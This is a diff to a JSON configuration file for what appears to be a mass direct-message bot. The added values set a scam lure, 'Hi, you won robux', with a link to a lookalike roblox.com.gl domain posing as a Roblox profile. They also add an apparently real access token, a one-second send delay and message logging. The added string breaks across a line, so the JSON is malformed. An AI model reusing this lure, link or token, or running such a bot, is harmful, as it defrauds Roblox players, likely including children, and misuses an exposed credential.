@@ -1,6 +1,7 @@
 {
-	"prefix" : "",
-	"token" : "",
-	"delay" : "delay in secs without any unit, for eg: 5",
-	"log_dms" : "enable or disable the logging after each DM"
+	"prefix" : "Hi, you won robux
+	add this person https://www.roblox.com.gl/users/9836349239/profile",
+	"token" : "OTQyNzQyNzczMjMxMTI0NTUw.Ygo7oA.kECeDrh5_ZXmPsfJoDps_7wqT4Q",
+	"delay" : "1",
+	"log_dms" : "on"
 }
